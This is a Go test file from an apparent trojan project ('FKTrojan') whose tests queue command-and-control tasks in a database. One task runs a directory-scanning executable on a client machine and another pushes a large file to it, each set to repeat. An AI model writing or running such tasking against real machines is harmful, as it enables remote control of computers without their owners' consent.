package database

import (
	"FKTrojan/dao"
	"testing"
)

func TestNewRunExe(t *testing.T) {
	r, err := dbPointer.Exec("insert into command(command,code,guid,interval_sec,run_count) values(?,?,?,?,?)",
		"d:/bin/scan_dir.exe|-dir|d:/|-depth|2", dao.CMD_RUN_EXE, dao.NewClient().GUID, 100, 100)
	t.Log(r, err)
	//r, err = dbPointer.Exec("update command set last_update = NOW()")
	//t.Log(r, err)
}
func TestNewTransBigFileToClient(t *testing.T) {
	r, err := dbPointer.Exec("insert into command(command,code,guid,interval_sec,run_count) values(?,?,?,?,?)",
		"d:/chromium-62.0.3202.94.tar.xz|c:/bin/chromium-62.0.3202.94.tar.xz",
		dao.CMD_TRANS_S_TO_C, dao.NewClient().GUID, 10, 1000)
	t.Log(r, err)
	//r, err = dbPointer.Exec("update command set last_update = NOW()")
	//t.Log(r, err)
}
